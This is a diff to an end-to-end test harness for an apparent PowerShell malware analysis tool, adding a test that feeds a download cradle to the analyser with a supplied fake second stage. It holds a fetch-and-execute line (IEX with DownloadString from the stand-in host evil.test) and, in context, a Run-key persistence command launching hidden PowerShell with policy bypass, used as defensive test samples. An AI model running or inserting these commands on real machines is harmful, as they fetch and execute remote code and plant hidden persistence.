@@ -62,6 +62,14 @@ const DROPPER = [
   `Set-ItemProperty -Path 'HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run' -Name Updater -Value "powershell -w hidden -ep bypass -f $p"`,
 ].join('; ');
 
+/**
+ * The cradle, for the stage-2 check. The URL matches the stage supplied in the
+ * panel by filename, which is the match that matters in practice: a sample
+ * builds its URL at runtime, so the name is the only part an analyst can key
+ * on before running it.
+ */
+const CRADLE = String.raw`IEX (New-Object Net.WebClient).DownloadString('http://evil.test/a/stage2.ps1?v=7')`;
+
 const serve = () =>
   createServer((request, response) => {
     let path = decodeURIComponent(request.url.split('?')[0]);
@@ -152,6 +160,34 @@ async function main() {
         noticeText.includes('MIT License'),
       'the notice carries the copyright and the licence text MIT requires',
     );
+
+    // A downloader's chain, through the product rather than the engine.
+    //
+    // The engine's own side of this is covered by stage2-probe.mjs. What only
+    // the real page can show is the seam: the panel's state reaching the
+    // worker and coming back as captured behaviour. Every bug this harness has
+    // caught so far has been in a seam like that one.
+    await page.getByRole('button', { name: 'Add a stage' }).click();
+    await page.getByPlaceholder('stage2.ps1, or the whole URL, or * for anything').fill('stage2.ps1');
+    await page
+      .getByPlaceholder('What the server would have returned.')
+      .fill(String.raw`Set-Content -Path 'C:\Users\Public\stage2-ran.txt' -Value 'second stage'`);
+    await page.fill('#husk-input', CRADLE);
+    await page.getByRole('button', { name: 'Analyse' }).click();
+
+    // Waiting on the stage's own artifact, not on the backend line: that line
+    // is already on the page from the first run and would match instantly.
+    let chainFollowed = true;
+    try {
+      await page.waitForFunction(
+        () => document.body.innerText.includes('stage2-ran.txt'),
+        null,
+        { timeout: 300_000 },
+      );
+    } catch {
+      chainFollowed = false;
+    }
+    check(chainFollowed, 'a supplied stage runs, and what it wrote is reported');
 
     check(pageErrors.length === 0, `no page errors${pageErrors.length ? `: ${pageErrors[0]}` : ''}`);
     check(offsite.length === 0, `nothing left the page${offsite.length ? `: ${offsite[0]}` : ''}`);
